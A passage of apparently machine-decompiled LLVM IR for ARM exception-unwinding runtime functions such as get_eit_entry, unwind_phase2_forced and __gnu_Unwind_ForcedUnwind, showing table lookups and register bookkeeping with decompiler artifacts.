  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_1927c, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_19284 = add i32 %context, 68
  %v2_19284 = inttoptr i32 %v1_19284 to i32*
  %v3_19284 = load i32, i32* %v2_19284, align 4
  ret i32 %v3_19284

; uselistorder directives
  uselistorder i32 68, { 10, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_19294 = add i32 %exc, 8
  %v2_19294 = inttoptr i32 %v1_19294 to i32*
  %v3_19294 = load i32, i32* %v2_19294, align 4
  %v2_19298 = icmp eq i32 %v3_19294, 0
  br i1 %v2_19298, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_192ac = xor i1 %v2_19298, true
  call void @__pseudo_cond_branch(i1 %v2_192ac, i32 %v3_19294)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_192c4 = call i32 @abort()
  ret i32 %v0_192c4
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_192d0 = call i32 @abort()
  ret i32 %v0_192d0
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_192d4 = load i32, i32* @r4, align 4
  store i32 %v3_192d4, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r5.global-to-local, align 4
  %v4_192e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 132) to i32*), align 4
  %v2_192e8 = icmp eq i32 %v4_192e4, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_192f4 = add i32 %return_address, -2
  store i32 %v1_192f4, i32* %r4.global-to-local, align 4
  br i1 %v2_192e8, label %dec_label_pc_1932c, label %dec_label_pc_192fc

dec_label_pc_192fc:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_192e4)
  %v2_1930c = icmp eq i32 %v1_192f4, 0
  br i1 %v2_1930c, label %.thread, label %dec_label_pc_1934cthread-pre-split

.thread:                                          ; preds = %dec_label_pc_192fc
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_19314 = load i32, i32* %r6.global-to-local, align 4
  %v3_19314 = add i32 %v2_19314, 16
  %v4_19314 = inttoptr i32 %v3_19314 to i32*
  store i32 0, i32* %v4_19314, align 4
  br label %dec_label_pc_1931c

dec_label_pc_1931c:                               ; preds = %.thread, %.thread10, %dec_label_pc_194c4, %dec_label_pc_194b0, %dec_label_pc_1948c, %dec_label_pc_19464, %dec_label_pc_19364
  %v0_1931c = load i32, i32* %r2.global-to-local, align 4
  %v2_19324 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_19324, i32* @r4, align 4
  ret i32 %v0_1931c

dec_label_pc_1932c:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_19334 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 20) to i32*), align 4
  %v4_19338 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 48) to i32*), align 4
  store i32 %v4_19338, i32* %r2.global-to-local, align 4
  %v2_1933c = sub i32 %v4_19334, %v4_19338
  %v3_19340 = sdiv i32 %v2_1933c, 8
  store i32 %v3_19340, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1934c

dec_label_pc_1934cthread-pre-split:               ; preds = %dec_label_pc_192fc
  %v3_1934c.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1934c

dec_label_pc_1934c:                               ; preds = %dec_label_pc_1934cthread-pre-split, %dec_label_pc_1932c
  %v0_19390.pre = phi i32 [ %v1_192f4, %dec_label_pc_1934cthread-pre-split ], [ %v4_19338, %dec_label_pc_1932c ]
  %v1_19354 = phi i32 [ %v3_1934c.pr, %dec_label_pc_1934cthread-pre-split ], [ %v3_19340, %dec_label_pc_1932c ]
  %v2_19350 = icmp eq i32 %v1_19354, 0
  br i1 %v2_19350, label %dec_label_pc_19364, label %dec_label_pc_19380.preheader

dec_label_pc_19380.preheader:                     ; preds = %dec_label_pc_1934c
  %v2_19354 = add i32 %v1_19354, -1
  %v1_193b0 = add i32 %v0_19390.pre, 8
  br label %dec_label_pc_19380.outer

dec_label_pc_19364.loopexit:                      ; preds = %dec_label_pc_193dc
  br label %dec_label_pc_19364

dec_label_pc_19364:                               ; preds = %dec_label_pc_19364.loopexit, %dec_label_pc_1934c, %dec_label_pc_194a8
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_1936c = load i32, i32* %r6.global-to-local, align 4
  %v2_1936c = add i32 %v1_1936c, 16
  %v3_1936c = inttoptr i32 %v2_1936c to i32*
  store i32 0, i32* %v3_1936c, align 4
  br label %dec_label_pc_1931c

dec_label_pc_19374:                               ; preds = %dec_label_pc_193d0
  %v3_19374 = icmp ult i32 %storemerge40, %v0_193d4
  br i1 %v3_19374, label %dec_label_pc_1937c, label %dec_label_pc_193ec

dec_label_pc_1937c:                               ; preds = %dec_label_pc_19374
  %v1_1937c = add nsw i32 %v3_19388, 1
  br label %dec_label_pc_19380.outer

dec_label_pc_19380.outer:                         ; preds = %dec_label_pc_1937c, %dec_label_pc_19380.preheader
  %v1_193dc.ph = phi i32 [ %v1_1937c, %dec_label_pc_1937c ], [ 0, %dec_label_pc_19380.preheader ]
  %v0_19380.ph = phi i32 [ %v0_19380, %dec_label_pc_1937c ], [ %v2_19354, %dec_label_pc_19380.preheader ]
  br label %dec_label_pc_19380

dec_label_pc_19380:                               ; preds = %dec_label_pc_19380.outer, %dec_label_pc_193e4
  %v0_19380 = phi i32 [ %v1_193e4, %dec_label_pc_193e4 ], [ %v0_19380.ph, %dec_label_pc_19380.outer ]
  %v2_19380 = add i32 %v0_19380, %v1_193dc.ph
  %tmp = icmp slt i32 %v2_19380, 0
  %v4_19384 = zext i1 %tmp to i32
  %v5_19384 = add i32 %v4_19384, %v2_19380
  %v3_19388 = sdiv i32 %v5_19384, 2
  %v3_1938c = mul i32 %v3_19388, 8
  store i32 %v3_1938c, i32* @ip, align 4
  %v2_19390 = add i32 %v3_1938c, %v0_19390.pre
  %v3_19390 = inttoptr i32 %v2_19390 to i32*
  %v4_19390 = load i32, i32* %v3_19390, align 4
  %v1_19394 = and i32 %v4_19390, 1073741824
  %v2_19394 = icmp eq i32 %v1_19394, 0
  %v2_19398 = or i32 %v4_19390, -2147483648
  %tmp79 = bitcast i32 %v4_19390 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_1939c = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_19394, i32 %v2_1939c, i32 %v2_19398
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_193a0 = icmp eq i32 %v2_19354, %v3_19388
  store i32 %v2_19390, i32* %r7.global-to-local, align 4
  br i1 %v9_193a0, label %dec_label_pc_193d0, label %dec_label_pc_193b0

dec_label_pc_193b0:                               ; preds = %dec_label_pc_19380
  %v2_193b4 = add i32 %v3_1938c, %v1_193b0
  %v3_193b4 = inttoptr i32 %v2_193b4 to i32*
  %v4_193b4 = load i32, i32* %v3_193b4, align 4
  %v1_193bc = and i32 %v4_193b4, 1073741824
  %v2_193bc = icmp eq i32 %v1_193bc, 0
  %v2_193c0 = or i32 %v4_193b4, -2147483648
  %tmp81 = bitcast i32 %v4_193b4 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_193c4 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_193bc, i32 %v2_193c4, i32 %v2_193c0
  %v1_193c8 = add i32 %v2_193b4, -1
  %v2_193cc = add i32 %storemerge39, %v1_193c8
  br label %dec_label_pc_193d0

dec_label_pc_193d0:                               ; preds = %dec_label_pc_19380, %dec_label_pc_193b0
  %storemerge40 = phi i32 [ %v2_193cc, %dec_label_pc_193b0 ], [ -1, %dec_label_pc_19380 ]
  %v2_193d0 = add i32 %storemerge, %v2_19390
  %v0_193d4 = load i32, i32* %r4.global-to-local, align 4
  %v3_193d4 = icmp ult i32 %v0_193d4, %v2_193d0
  br i1 %v3_193d4, label %dec_label_pc_193dc, label %dec_label_pc_19374

dec_label_pc_193dc:                               ; preds = %dec_label_pc_193d0
  %v9_193dc = icmp eq i32 %v3_19388, %v1_193dc.ph
  br i1 %v9_193dc, label %dec_label_pc_19364.loopexit, label %dec_label_pc_193e4

dec_label_pc_193e4:                               ; preds = %dec_label_pc_193dc
  %v1_193e4 = add nsw i32 %v3_19388, -1
  br label %dec_label_pc_19380

dec_label_pc_193ec:                               ; preds = %dec_label_pc_19374
  %v2_193ec = load i32, i32* %v3_19390, align 4
  %v1_193f0 = and i32 %v2_193ec, 1073741824
  %v2_193f0 = icmp eq i32 %v1_193f0, 0
  %v2_193f4 = or i32 %v2_193ec, -2147483648
  %tmp83 = bitcast i32 %v2_193ec to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_193f8 = bitcast float %tmp84 to i32
  %v0_193fc = select i1 %v2_193f0, i32 %v2_193f8, i32 %v2_193f4
  %v2_193fc = add i32 %v0_193fc, %v2_19390
  %v1_19400 = load i32, i32* %r6.global-to-local, align 4
  %v2_19400 = add i32 %v1_19400, 72
  %v3_19400 = inttoptr i32 %v2_19400 to i32*
  store i32 %v2_193fc, i32* %v3_19400, align 4
  %v0_19404 = load i32, i32* %r7.global-to-local, align 4
  %v1_19404 = add i32 %v0_19404, 4
  %v2_19404 = inttoptr i32 %v1_19404 to i32*
  %v3_19404 = load i32, i32* %v2_19404, align 4
  %v7_19408 = icmp eq i32 %v3_19404, 1
  br i1 %v7_19408, label %.thread10, label %dec_label_pc_1941c

.thread10:                                        ; preds = %dec_label_pc_193ec
  %v1_19408 = add i32 %v3_19404, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_19414 = load i32, i32* %r6.global-to-local, align 4
  %v3_19414 = add i32 %v2_19414, 16
  %v4_19414 = inttoptr i32 %v3_19414 to i32*
  store i32 %v1_19408, i32* %v4_19414, align 4
  br label %dec_label_pc_1931c

dec_label_pc_1941c:                               ; preds = %dec_label_pc_193ec
  %v1_1941c = icmp slt i32 %v3_19404, 0
  br i1 %v1_1941c, label %.thread38, label %dec_label_pc_19434

.thread38:                                        ; preds = %dec_label_pc_1941c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_19428 = load i32, i32* %r6.global-to-local, align 4
  %v5_19428 = add i32 %v4_19428, 76
  %v6_19428 = inttoptr i32 %v5_19428 to i32*
  store i32 %v1_19404, i32* %v6_19428, align 4
  %v3_1942c = load i32, i32* %r2.global-to-local, align 4
  %v4_1942c = load i32, i32* %r6.global-to-local, align 4
  %v5_1942c = add i32 %v4_1942c, 80
  %v6_1942c = inttoptr i32 %v5_1942c to i32*
  store i32 %v3_1942c, i32* %v6_1942c, align 4
  br label %dec_label_pc_19454

dec_label_pc_19434:                               ; preds = %dec_label_pc_1941c
  %v1_19434 = and i32 %v3_19404, 1073741824
  %v2_19434 = icmp eq i32 %v1_19434, 0
  %v2_19438 = or i32 %v3_19404, -2147483648
  %tmp85 = bitcast i32 %v3_19404 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_1943c = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_19434, i32 %v2_1943c, i32 %v2_19438
  %v1_19440 = add i32 %storemerge42, 4
  %v2_19444 = add i32 %v1_19440, %v0_19404
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1944c = load i32, i32* %r6.global-to-local, align 4
  %v2_1944c = add i32 %v1_1944c, 76
  %v3_1944c = inttoptr i32 %v2_1944c to i32*
  store i32 %v2_19444, i32* %v3_1944c, align 4
  %v0_19450 = load i32, i32* %r2.global-to-local, align 4
  %v1_19450 = load i32, i32* %r6.global-to-local, align 4
  %v2_19450 = add i32 %v1_19450, 80
  %v3_19450 = inttoptr i32 %v2_19450 to i32*
  store i32 %v0_19450, i32* %v3_19450, align 4
  br label %dec_label_pc_19454

dec_label_pc_19454:                               ; preds = %.thread38, %dec_label_pc_19434
  %v0_19454 = load i32, i32* %r6.global-to-local, align 4
  %v1_19454 = add i32 %v0_19454, 76
  %v2_19454 = inttoptr i32 %v1_19454 to i32*
  %v3_19454 = load i32, i32* %v2_19454, align 4
  store i32 %v3_19454, i32* %r2.global-to-local, align 4
  %v1_19458 = inttoptr i32 %v3_19454 to i32*
  %v2_19458 = load i32, i32* %v1_19458, align 4
  %v1_1945c = icmp slt i32 %v2_19458, 0
  br i1 %v1_1945c, label %dec_label_pc_19480, label %dec_label_pc_19464

dec_label_pc_19464:                               ; preds = %dec_label_pc_19454
  %v1_19464 = and i32 %v2_19458, 1073741824
  %v2_19464 = icmp eq i32 %v1_19464, 0
  %v2_19468 = or i32 %v2_19458, -2147483648
  %tmp87 = bitcast i32 %v2_19458 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_1946c = bitcast float %tmp88 to i32
  %v0_19470 = select i1 %v2_19464, i32 %v2_1946c, i32 %v2_19468
  %v2_19470 = add i32 %v0_19470, %v3_19454
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_19478 = add i32 %v0_19454, 16
  %v3_19478 = inttoptr i32 %v2_19478 to i32*
  store i32 %v2_19470, i32* %v3_19478, align 4
  br label %dec_label_pc_1931c

dec_label_pc_19480:                               ; preds = %dec_label_pc_19454
  %v3_19480 = udiv i32 %v2_19458, 16777216
  %v1_19484 = urem i32 %v3_19480, 16
  %v2_19484 = icmp eq i32 %v1_19484, 0
  br i1 %v2_19484, label %dec_label_pc_1948c, label %dec_label_pc_194a0

dec_label_pc_1948c:                               ; preds = %dec_label_pc_19480
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_19494 = load i32, i32* %r5.global-to-local, align 4
  %v2_19494 = add i32 %v0_19494, -38188
  %v2_19498 = add i32 %v0_19454, 16
  %v3_19498 = inttoptr i32 %v2_19498 to i32*
  store i32 %v2_19494, i32* %v3_19498, align 4
  br label %dec_label_pc_1931c

dec_label_pc_194a0:                               ; preds = %dec_label_pc_19480
  %v7_194a0 = icmp eq i32 %v1_19484, 1
  br i1 %v7_194a0, label %dec_label_pc_194c4, label %dec_label_pc_194a8

dec_label_pc_194a8:                               ; preds = %dec_label_pc_194a0
  %v7_194a8 = icmp eq i32 %v1_19484, 2
  br i1 %v7_194a8, label %dec_label_pc_194b0, label %dec_label_pc_19364

dec_label_pc_194b0:                               ; preds = %dec_label_pc_194a8
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_194b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_194b8 = add i32 %v0_194b8, -38204
  %v2_194bc = add i32 %v0_19454, 16
  %v3_194bc = inttoptr i32 %v2_194bc to i32*
  store i32 %v2_194b8, i32* %v3_194bc, align 4
  br label %dec_label_pc_1931c

dec_label_pc_194c4:                               ; preds = %dec_label_pc_194a0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_194cc = load i32, i32* %r5.global-to-local, align 4
  %v2_194cc = add i32 %v0_194cc, -38196
  %v2_194d0 = add i32 %v0_19454, 16
  %v3_194d0 = inttoptr i32 %v2_194d0 to i32*
  store i32 %v2_194cc, i32* %v3_194d0, align 4
  br label %dec_label_pc_1931c

; uselistorder directives
  uselistorder i32 %v1_19484, { 2, 1, 0 }
  uselistorder i32 %v0_19454, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_19404, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_193d4, { 1, 0 }
  uselistorder i32 %v3_1938c, { 2, 1, 0 }
  uselistorder i32 %v3_19388, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_19380, { 1, 0 }
  uselistorder i32 %v0_19380, { 1, 0 }
  uselistorder i32 %v2_19354, { 1, 0 }
  uselistorder i32 %v0_19390.pre, { 1, 0 }
  uselistorder i32 %v3_19340, { 1, 0 }
  uselistorder i32 %v1_192f4, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_19454, { 1, 0 }
  uselistorder label %dec_label_pc_193d0, { 1, 0 }
  uselistorder label %dec_label_pc_19380, { 1, 0 }
  uselistorder label %dec_label_pc_19364, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1931c, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_194dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_194dc:
  %v0_194dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_194dc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_194dc
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_194dc, %bb
  %v10_194e4 = phi i32 [ %arg1, %dec_label_pc_194dc ], [ 0, %bb ]
  ret i32 %v10_194e4

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_194f8 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_1950c = inttoptr i32 %v1_194f8 to i32*
  %v2_1950c = load i32, i32* %v1_1950c, align 4
  store i32 %v2_1950c, i32* %r0.global-to-local, align 4
  %v12_1950c = add i32 %entry_vrs, 20
  %v1_19518 = inttoptr i32 %v12_1950c to i32*
  %v2_19518 = load i32, i32* %v1_19518, align 4
  store i32 %v2_19518, i32* %r0.global-to-local, align 4
  %v12_19518 = add i32 %entry_vrs, 36
  %v1_19520 = inttoptr i32 %v12_19518 to i32*
  %v2_19520 = load i32, i32* %v1_19520, align 4
  store i32 %v2_19520, i32* %r0.global-to-local, align 4
  %v12_19520 = add i32 %entry_vrs, 52
  store i32 %v12_19520, i32* @ip, align 4
  %v13_19524 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_19524, i32* @lr, align 4
  %v1_19528 = inttoptr i32 %v12_19520 to i32*
  %v2_19528 = load i32, i32* %v1_19528, align 4
  store i32 %v2_19528, i32* %r0.global-to-local, align 4
  %v9_19528 = add i32 %entry_vrs, 64
  %v10_19528 = inttoptr i32 %v9_19528 to i32*
  %v11_19528 = load i32, i32* %v10_19528, align 4
  store i32 0, i32* @r4, align 4
  %v1_19530 = add i32 %ucbp, 12
  %v2_19530 = inttoptr i32 %v1_19530 to i32*
  %v3_19530 = load i32, i32* %v2_19530, align 4
  store i32 %v2_19528, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_19548 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_19528)
  store i32 %v2_19548, i32* %r0.global-to-local, align 4
  %v0_1954c = load i32, i32* @r6, align 4
  %v1_1954c = load i32, i32* @r4, align 4
  %v9_1954c = icmp eq i32 %v0_1954c, %v1_1954c
  store i32 %v2_19548, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_1954c, label %dec_label_pc_19560, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_1956c

dec_label_pc_19560:                               ; preds = %entry
  store i32 %v0_1954c, i32* @r4, align 4
  br label %dec_label_pc_19568

dec_label_pc_19568:                               ; preds = %dec_label_pc_19630, %dec_label_pc_19560
  br label %dec_label_pc_1956c

dec_label_pc_1956c:                               ; preds = %.thread, %dec_label_pc_19568
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_19568 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_1956c = icmp eq i32 %v2_19548, 0
  br i1 %v2_1956c, label %dec_label_pc_195e4, label %.thread2.dec_label_pc_19580_crit_edge

.thread2.dec_label_pc_19580_crit_edge:            ; preds = %dec_label_pc_1956c
  br label %dec_label_pc_19580

dec_label_pc_19580:                               ; preds = %.thread2.dec_label_pc_19580_crit_edge, %dec_label_pc_195e4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_19590 = load i32, i32* @r5, align 4
  store i32 %v0_19590, i32* @r3, align 4
  store i32 103840, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_19530)
  br i1 false, label %dec_label_pc_195a8, label %dec_label_pc_195d0

dec_label_pc_195a8:                               ; preds = %dec_label_pc_19580
  br i1 undef, label %dec_label_pc_195b0, label %dec_label_pc_195d4

dec_label_pc_195b0:                               ; preds = %dec_label_pc_195a8
  br i1 undef, label %dec_label_pc_19630, label %dec_label_pc_195c8

dec_label_pc_195c8:                               ; preds = %dec_label_pc_195b0
  br i1 undef, label %dec_label_pc_19628, label %dec_label_pc_195d0

dec_label_pc_195d0:                               ; preds = %dec_label_pc_19580, %dec_label_pc_195c8
  br label %dec_label_pc_195d4

dec_label_pc_195d4:                               ; preds = %dec_label_pc_195a8, %dec_label_pc_195d0
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_195e4:                               ; preds = %dec_label_pc_1956c
  store i32 %v11_19528, i32* @r3, align 4
  %v2_195e8 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_195e8, i32* @r4, align 4
  %v1_195ec = load i32, i32* @r5, align 4
  %v2_195ec = add i32 %v1_195ec, 20
  %v3_195ec = inttoptr i32 %v2_195ec to i32*
  store i32 %v11_19528, i32* %v3_195ec, align 4
  store i32 %v2_195e8, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_195fc = call i32 @memcpy()
  %v0_19604 = load i32, i32* @r6, align 4
  store i32 %v0_19604, i32* %r0.global-to-local, align 4
  %v0_19608 = load i32, i32* @r5, align 4
  %v1_1960c = add i32 %v0_19608, 16
  %v2_1960c = inttoptr i32 %v1_1960c to i32*
  %v3_1960c = load i32, i32* %v2_1960c, align 4
  store i32 %v3_1960c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_1960c)
  %v0_1961c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1961c, i32* @r4, align 4
  br label %dec_label_pc_19580

dec_label_pc_19628:                               ; preds = %dec_label_pc_195c8
  br label %dec_label_pc_19630

dec_label_pc_19630:                               ; preds = %dec_label_pc_195b0, %dec_label_pc_19628
  br label %dec_label_pc_19568

; uselistorder directives
  uselistorder i32 %v11_19528, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 3, 7, 6, 1, 0, 5, 2, 9, 8, 4 }
  uselistorder i32* @r3, { 96, 97, 33, 34, 22, 98, 99, 25, 100, 101, 4, 102, 103, 104, 5, 105, 106, 107, 6, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 0, 126, 127, 128, 129, 23, 24, 26, 27, 28, 29, 30, 31, 32, 65, 51, 52, 53, 130, 131, 144, 145, 146, 134, 135, 136, 137, 138, 1, 139, 8, 36, 37, 132, 133, 64, 66, 67, 68, 69, 70, 71, 73, 72, 11, 12, 13, 150, 147, 148, 149, 2, 151, 152, 153, 35, 38, 39, 40, 41, 42, 43, 140, 141, 142, 143, 74, 75, 76, 77, 54, 78, 79, 10, 80, 81, 82, 83, 84, 85, 86, 3, 14, 15, 16, 17, 18, 19, 20, 21, 44, 45, 46, 47, 49, 48, 50, 55, 9, 56, 57, 58, 59, 60, 61, 62, 63, 87, 88, 89, 90, 91, 92, 7, 93, 94, 95 }
  uselistorder i32 10, { 1, 2, 37, 38, 39, 5, 52, 51, 87, 79, 53, 80, 0, 10, 40, 41, 42, 11, 35, 36, 30, 4, 43, 31, 12, 32, 44, 13, 45, 14, 46, 15, 47, 16, 48, 17, 49, 50, 18, 19, 20, 21, 22, 23, 6, 54, 55, 56, 57, 58, 59, 60, 61, 62, 24, 63, 64, 65, 7, 66, 67, 68, 25, 8, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 26, 81, 3, 82, 83, 28, 84, 33, 34, 9, 85, 27, 86, 29 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_19630, { 1, 0 }
  uselistorder label %dec_label_pc_195d4, { 1, 0 }
  uselistorder label %dec_label_pc_195d0, { 1, 0 }
  uselistorder label %dec_label_pc_19580, { 1, 0 }
  uselistorder label %dec_label_pc_1956c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_19644 = add i32 %ucbp, 12
  %v3_19644 = inttoptr i32 %v2_19644 to i32*
  store i32 %stop_fn, i32* %v3_19644, align 4
  %v3_19648 = add i32 %ucbp, 24
  %v4_19648 = inttoptr i32 %v3_19648 to i32*
  store i32 %tmp, i32* %v4_19648, align 4
  %v1_1964c = add i32 %entry_vrs, 60
  %v2_1964c = inttoptr i32 %v1_1964c to i32*
  %v3_1964c = load i32, i32* %v2_1964c, align 4
  %v2_19654 = add i32 %entry_vrs, 64
  %v3_19654 = inttoptr i32 %v2_19654 to i32*
  store i32 %v3_1964c, i32* %v3_19654, align 4
  %v3_1965c = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_1965c

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_196746 = add i32 %vrs, 64
  %v2_196747 = inttoptr i32 %v1_196746 to i32*
  %v3_196748 = load i32, i32* %v2_196747, align 4
  %v2_196789 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_196748)
  store i32 %v2_196789, i32* %r0.global-to-local, align 4
  %v2_1967c11 = icmp eq i32 %v2_196789, 0
  br i1 %v2_1967c11, label %dec_label_pc_19684, label %dec_label_pc_196b4

dec_label_pc_19684:                               ; preds = %entry, %dec_label_pc_19684.dec_label_pc_19670_crit_edge
  %v0_19684 = load i32, i32* @r5, align 4
  %v1_19684 = add i32 %v0_19684, 64
  %v2_19684 = inttoptr i32 %v1_19684 to i32*
  %v3_19684 = load i32, i32* %v2_19684, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1968c = load i32, i32* @r4, align 4
  %v2_1968c = add i32 %v1_1968c, 20
  %v3_1968c = inttoptr i32 %v2_1968c to i32*
  store i32 %v3_19684, i32* %v3_1968c, align 4
  %v0_19690 = load i32, i32* @r4, align 4
  %v1_19698 = add i32 %v0_19690, 16
  %v2_19698 = inttoptr i32 %v1_19698 to i32*
  %v3_19698 = load i32, i32* %v2_19698, align 4
  call void @__pseudo_branch(i32 %v3_19698)
  %v0_196a4 = load i32, i32* %r0.global-to-local, align 4
  %v7_196a4 = icmp eq i32 %v0_196a4, 8
  br i1 %v7_196a4, label %dec_label_pc_19684.dec_label_pc_19670_crit_edge, label %dec_label_pc_196ac

dec_label_pc_19684.dec_label_pc_19670_crit_edge:  ; preds = %dec_label_pc_19684
  %v0_19670.pre = load i32, i32* @r4, align 4
  %v0_19674.pre = load i32, i32* @r5, align 4
  store i32 %v0_19670.pre, i32* %r0.global-to-local, align 4
  %v1_19674 = add i32 %v0_19674.pre, 64
  %v2_19674 = inttoptr i32 %v1_19674 to i32*
  %v3_19674 = load i32, i32* %v2_19674, align 4
  %v2_19678 = call i32 @get_eit_entry(i32 %v0_19670.pre, i32 %v3_19674)
  store i32 %v2_19678, i32* %r0.global-to-local, align 4
  %v2_1967c = icmp eq i32 %v2_19678, 0
  br i1 %v2_1967c, label %dec_label_pc_19684, label %dec_label_pc_196b4

dec_label_pc_196ac:                               ; preds = %dec_label_pc_19684
  %v7_196ac = icmp eq i32 %v0_196a4, 7
  br i1 %v7_196ac, label %dec_label_pc_196b8, label %dec_label_pc_196b4

dec_label_pc_196b4:                               ; preds = %entry, %dec_label_pc_19684.dec_label_pc_19670_crit_edge, %dec_label_pc_196ac
  %v0_196b4 = call i32 @abort()
  store i32 %v0_196b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_196b8

dec_label_pc_196b8:                               ; preds = %dec_label_pc_196ac, %dec_label_pc_196b4
  %v0_196b8 = load i32, i32* @r5, align 4
  %v1_196b8 = add i32 %v0_196b8, 4
  store i32 %v1_196b8, i32* %r0.global-to-local, align 4
